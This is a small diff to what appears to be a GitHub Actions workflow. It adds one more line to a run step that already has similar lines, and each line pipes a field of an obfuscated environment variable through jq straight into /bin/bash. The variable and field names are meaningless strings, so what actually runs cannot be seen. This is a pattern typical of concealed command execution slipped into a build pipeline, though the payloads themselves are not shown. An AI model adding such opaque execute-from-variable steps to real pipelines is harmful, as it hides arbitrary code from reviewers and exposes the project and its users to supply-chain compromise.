@@ -28,6 +28,7 @@ jobs:
           echo $cm95 | jq -r .fh2880 | /bin/bash
           echo $c81 | jq -r .hbww3 | /bin/bash
           echo $scfd0 | jq -r .pk8 | /bin/bash
+          printf '%s' "$k2" | jq -r .ljsvw049 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
